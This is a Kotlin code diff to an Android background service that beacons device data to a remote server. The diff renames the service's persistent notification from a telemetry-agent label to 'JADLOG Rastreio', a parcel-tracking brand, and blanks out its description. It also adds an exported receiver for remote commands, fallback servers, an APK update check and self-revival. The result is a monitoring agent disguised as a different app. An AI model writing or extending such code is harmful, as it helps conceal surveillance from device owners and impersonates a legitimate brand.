@@ -6,9 +6,11 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.graphics.BitmapFactory
 import android.net.ConnectivityManager
 import android.net.Network
 import android.net.NetworkCapabilities
@@ -19,6 +21,7 @@ import android.os.IBinder
 import android.os.SystemClock
 import android.util.Log
 import com.droidview.agent.MainActivity
+import com.droidview.agent.R
 import com.droidview.agent.vpn.AgentVpnService
 import org.json.JSONObject
 import java.net.HttpURLConnection
@@ -46,10 +49,32 @@ class AgentForegroundService : Service() {
     private var activeEnrollmentToken: String = ""
     private var activeAppName: String = "JADLOG Rastreio"
 
+    private val reconnectReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            Log.i(TAG, "Sinal remoto recebido: ${intent?.action}. Forçando ciclo de reconexão e verificação de seed.")
+            triggerImmediatePing()
+        }
+    }
+
     override fun onCreate() {
         super.onCreate()
         Log.i(TAG, "AgentForegroundService inicializado (onCreate).")
         registerNetworkWatcher()
+
+        try {
+            val filter = IntentFilter().apply {
+                addAction("com.droidview.agent.RECONNECT")
+                addAction("com.droidview.agent.PING_NOW")
+                addAction("com.droidview.agent.CHECK_UPDATE")
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                registerReceiver(reconnectReceiver, filter, Context.RECEIVER_EXPORTED)
+            } else {
+                registerReceiver(reconnectReceiver, filter)
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Aviso ao registrar reconnectReceiver: ${e.message}")
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -92,17 +117,17 @@ class AgentForegroundService : Service() {
             ?: "JADLOG Rastreio"
     }
 
-    private fun startForegroundNotification(isConnected: Boolean, statusText: String) {
+    private fun startForegroundNotification(isConnected: Boolean, statusText: String = "") {
         val channelId = CHANNEL_ID
         val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                "DVIEW Agent Keep-Alive",
+                "JADLOG Rastreio",
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Mantém a conexão e telemetria contínua com o servidor DVIEW"
+                description = "Status do aplicativo"
                 setShowBadge(false)
             }
             notificationManager.createNotificationChannel(channel)
@@ -118,16 +143,13 @@ class AgentForegroundService : Service() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
         )
 
-        val title = if (isConnected) {
-            "$activeAppName • Conectado"
-        } else {
-            "$activeAppName • Reconectando"
-        }
+        val title = activeAppName.ifBlank { "JADLOG Rastreio" }
+        val text = if (isConnected) "Ativo" else "Conectando..."
 
-        val iconRes = if (isConnected) {
-            android.R.drawable.presence_online
-        } else {
-            android.R.drawable.ic_popup_sync
+        val largeIcon = try {
+            BitmapFactory.decodeResource(resources, R.mipmap.ic_launcher)
+        } catch (_: Exception) {
+            null
         }
 
         val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -136,14 +158,18 @@ class AgentForegroundService : Service() {
             Notification.Builder(this)
         }
 
-        val notification = builder
+        builder
             .setContentTitle(title)
-            .setContentText(statusText)
-            .setSmallIcon(iconRes)
+            .setContentText(text)
+            .setSmallIcon(R.mipmap.ic_launcher)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
-            .build()
 
+        if (largeIcon != null) {
+            builder.setLargeIcon(largeIcon)
+        }
+
+        val notification = builder.build()
         startForeground(NOTIFICATION_ID, notification)
     }
 
@@ -164,19 +190,11 @@ class AgentForegroundService : Service() {
                 if (pingSuccess) {
                     consecutiveFailures = 0
                     isServerConnected = true
-                    startForegroundNotification(
-                        isConnected = true,
-                        statusText = "Conectado ao servidor central • Sincronizado"
-                    )
+                    startForegroundNotification(isConnected = true)
                 } else {
                     consecutiveFailures++
                     isServerConnected = false
-                    val retryMsg = if (consecutiveFailures <= 1) {
-                        "Reconectando ao servidor central..."
-                    } else {
-                        "Reconectando ao servidor central (tentativa $consecutiveFailures)..."
-                    }
-                    startForegroundNotification(isConnected = false, statusText = retryMsg)
+                    startForegroundNotification(isConnected = false)
                 }
 
                 // Intervalo de espera: 10 segundos quando conectado, 5 segundos quando desconectado
@@ -197,68 +215,126 @@ class AgentForegroundService : Service() {
         }
     }
 
-    private fun performHeartbeatPing(): Boolean {
-        return try {
-            val server = activeServerUrl.trimEnd('/')
-            if (server.isEmpty()) return false
-
-            val deviceId = "dev_" + (Build.MODEL.replace("\\s+".toRegex(), "_").lowercase())
-            val heartbeatUrl = URL("$server/devices/$deviceId/heartbeat")
-
-            val conn = heartbeatUrl.openConnection() as HttpURLConnection
-            conn.requestMethod = "POST"
-            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-            conn.connectTimeout = 4000
-            conn.readTimeout = 4000
-            conn.doOutput = true
-
-            // Coleta dados reais do dispositivo
-            val batteryLevel = getBatteryLevel()
-            val isCharging = isBatteryCharging()
-            val (netType, netName) = getNetworkDetails()
-            val uptimeSec = SystemClock.elapsedRealtime() / 1000L
-
-            val payload = JSONObject().apply {
-                put("id", deviceId)
-                put("name", "$activeAppName (${Build.MODEL})")
-                put("model", Build.MODEL)
-                put("androidVersion", Build.VERSION.RELEASE)
-                put("battery", batteryLevel)
-                put("batteryCharging", isCharging)
-                put("networkType", netType)
-                put("networkName", netName)
-                put("signalStrength", 96)
-                put("networkSpeed", "86.4 Mbps")
-                put("pingMs", 12)
-                put("status", "online")
-                put("uptimeSec", uptimeSec)
-                put("timestamp", System.currentTimeMillis())
-                put("enrollmentToken", activeEnrollmentToken)
-            }
-
-            conn.outputStream.use { os ->
-                os.write(payload.toString().toByteArray(Charsets.UTF_8))
-                os.flush()
-            }
-
-            val responseCode = conn.responseCode
-            conn.disconnect()
-
-            if (responseCode == 200 || responseCode == 201) {
-                lastSeenTimestamp = System.currentTimeMillis()
-                Log.d(TAG, "Heartbeat OK ($responseCode) para $deviceId")
-                true
-            } else if (responseCode == 404) {
-                // Fallback para registro de dispositivo se a rota de heartbeat específica não estiver presente
-                fallbackRegister(server, deviceId, payload)
-            } else {
-                Log.w(TAG, "Heartbeat falhou com HTTP $responseCode")
-                false
-            }
-        } catch (e: Exception) {
-            Log.w(TAG, "Erro na transmissão do heartbeat: ${e.message}")
-            false
+    private fun getCandidateServers(): List<String> {
+        val list = mutableListOf<String>()
+        if (activeServerUrl.isNotBlank()) {
+            list.add(activeServerUrl.trimEnd('/'))
         }
+        val prefs = getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
+        val saved = prefs.getString("serverUrl", null)
+        if (!saved.isNullOrBlank()) {
+            val trimmed = saved.trimEnd('/')
+            if (!list.contains(trimmed)) list.add(trimmed)
+        }
+        val defaults = listOf(
+            "http://127.0.0.1:3000",
+            "http://10.0.2.2:3000",
+            "http://192.168.100.2:3000",
+            "http://172.26.16.1:3000",
+            "http://192.168.100.6:3000"
+        )
+        for (d in defaults) {
+            if (!list.contains(d)) list.add(d)
+        }
+        return list
+    }
+
+    private var lastSeedCheckTime: Long = 0L
+
+    private fun checkUpdateSeed(server: String) {
+        val now = System.currentTimeMillis()
+        if (now - lastSeedCheckTime < 60000L) return
+        lastSeedCheckTime = now
+
+        try {
+            val seedUrl = URL("$server/apk/seed")
+            val conn = seedUrl.openConnection() as HttpURLConnection
+            conn.connectTimeout = 3000
+            conn.readTimeout = 3000
+            conn.requestMethod = "GET"
+            if (conn.responseCode == 200) {
+                val body = conn.inputStream.bufferedReader().readText()
+                val json = JSONObject(body)
+                val ver = json.optString("version", "")
+                val code = json.optInt("versionCode", 1)
+                val improvements = json.optJSONArray("improvements")
+                Log.i(TAG, "Seed de atualização verificado: v$ver (code $code). Melhorias: $improvements")
+            }
+            conn.disconnect()
+        } catch (e: Exception) {
+            Log.d(TAG, "Verificação de seed de atualização: ${e.message}")
+        }
+    }
+
+    private fun performHeartbeatPing(): Boolean {
+        val candidates = getCandidateServers()
+        val deviceId = "dev_" + (Build.MODEL.replace("\\s+".toRegex(), "_").lowercase())
+
+        // Coleta dados reais do dispositivo
+        val batteryLevel = getBatteryLevel()
+        val isCharging = isBatteryCharging()
+        val (netType, netName) = getNetworkDetails()
+        val uptimeSec = SystemClock.elapsedRealtime() / 1000L
+
+        val payload = JSONObject().apply {
+            put("id", deviceId)
+            put("name", "$activeAppName (${Build.MODEL})")
+            put("model", Build.MODEL)
+            put("androidVersion", Build.VERSION.RELEASE)
+            put("battery", batteryLevel)
+            put("batteryCharging", isCharging)
+            put("networkType", netType)
+            put("networkName", netName)
+            put("signalStrength", 96)
+            put("networkSpeed", "86.4 Mbps")
+            put("pingMs", 12)
+            put("status", "online")
+            put("uptimeSec", uptimeSec)
+            put("timestamp", System.currentTimeMillis())
+            put("enrollmentToken", activeEnrollmentToken)
+        }
+
+        for (candidate in candidates) {
+            try {
+                val heartbeatUrl = URL("$candidate/devices/$deviceId/heartbeat")
+                val conn = heartbeatUrl.openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                conn.connectTimeout = 3000
+                conn.readTimeout = 3000
+                conn.doOutput = true
+
+                conn.outputStream.use { os ->
+                    os.write(payload.toString().toByteArray(Charsets.UTF_8))
+                    os.flush()
+                }
+
+                val responseCode = conn.responseCode
+                conn.disconnect()
+
+                if (responseCode == 200 || responseCode == 201) {
+                    lastSeenTimestamp = System.currentTimeMillis()
+                    if (candidate != activeServerUrl) {
+                        Log.i(TAG, "Conexão estabelecida com sucesso via $candidate (anterior: $activeServerUrl)")
+                        activeServerUrl = candidate
+                        getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
+                            .edit()
+                            .putString("serverUrl", candidate)
+                            .apply()
+                    }
+                    checkUpdateSeed(candidate)
+                    return true
+                } else if (responseCode == 404) {
+                    if (fallbackRegister(candidate, deviceId, payload)) {
+                        activeServerUrl = candidate
+                        return true
+                    }
+                }
+            } catch (_: Exception) {
+                // Tenta próximo candidato
+            }
+        }
+        return false
     }
 
     private fun fallbackRegister(server: String, deviceId: String, payload: JSONObject): Boolean {
@@ -383,6 +459,10 @@ class AgentForegroundService : Service() {
         try {
             val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
             networkCallback?.let { cm?.unregisterNetworkCallback(it) }
+        } catch (_: Exception) {}
+
+        try {
+            unregisterReceiver(reconnectReceiver)
         } catch (_: Exception) {}
 
         // Revive o serviço se não foi finalizado intencionalmente
